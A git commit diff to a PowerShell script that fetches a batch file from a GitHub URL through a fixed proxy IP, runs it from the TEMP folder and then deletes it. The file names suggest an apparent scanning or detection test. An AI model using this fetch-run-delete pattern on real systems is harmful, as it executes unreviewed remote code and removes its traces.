1c0ecad9182b46b8e2188c9caf8f360e5ac3812e
tameval <114147355+tameval@users.noreply.github.com>
2022-10-23 19:32:34 +0900

    Update scan_124509pr.ps1

--- 124509/proxy/scan_124509pr.ps1
+++ 124509/proxy/scan_124509pr.ps1
@@ -1,3 +1,3 @@
-Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scanning_dga.bat" -Proxy "http://13.231.199.128:3128" -OutFile $env:TEMP\scan.bat
+Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan.bat" -Proxy "http://13.231.199.128:3128" -OutFile $env:TEMP\scan.bat
 Start-Process -Wait $env:TEMP\scan.bat
 Remove-Item $env:TEMP\scan.bat
